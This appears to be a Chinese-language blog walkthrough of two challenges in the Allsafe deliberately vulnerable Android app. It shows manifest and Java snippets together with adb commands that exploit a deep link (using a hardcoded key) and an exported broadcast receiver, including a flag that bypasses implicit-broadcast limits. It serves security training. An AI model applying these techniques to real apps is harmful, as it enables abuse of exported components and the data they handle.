title: allSafe
date: 2023-01-25 16:55:12
tags:
---
## 1.Deep Link Exploitation 
声明：

        <activity android:theme="@style/Theme.Allsafe.NoActionBar" android:name="infosecadventures.allsafe.challenges.DeepLinkTask">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="allsafe" android:host="infosecadventures" android:pathPrefix="/congrats"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="https"/>
            </intent-filter>
        </activity>
代码：

    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();

    Log.d("ALLSAFE", "Action: " + action + " Data: " + data);

    try {
        if (data.getQueryParameter("key").equals(getString(R.string.key))) {
            findViewById(R.id.container).setVisibility(View.VISIBLE);
            SnackUtil.INSTANCE.simpleMessage(this, "Good job, you did it!");
        } else {
            SnackUtil.INSTANCE.simpleMessage(this, "Wrong key, try harder!");
        }
    } catch (Exception e) {
        SnackUtil.INSTANCE.simpleMessage(this, "No key provided!");
        Log.e("ALLSAFE", e.getMessage());
    }

adb 命令行：

	adb shell am start -a android.intent.acton.VIEW -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
    
* scheme host pathPrefix 以及 其余参数

allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c
    
## 2.inSecure Broadcast Receiver

        <receiver
            android:name=".challenges.NoteReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="infosecadventures.allsafe.action.PROCESS_NOTE" />
            </intent-filter>
        </receiver>
        
接受代码:

	String server = intent.getStringExtra("server");
    String note = intent.getStringExtra("note");
    String notification_message = intent.getStringExtra("notification_message");
    
adb命令：

adb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE --es server "nuoen.com" --es note "thenote" --es notification_message "pleasclickme" -f 0x01000000

加上-f 0x1=01000000 突破隐式广播限制

https://www.jianshu.com/p/5283ebc225d5



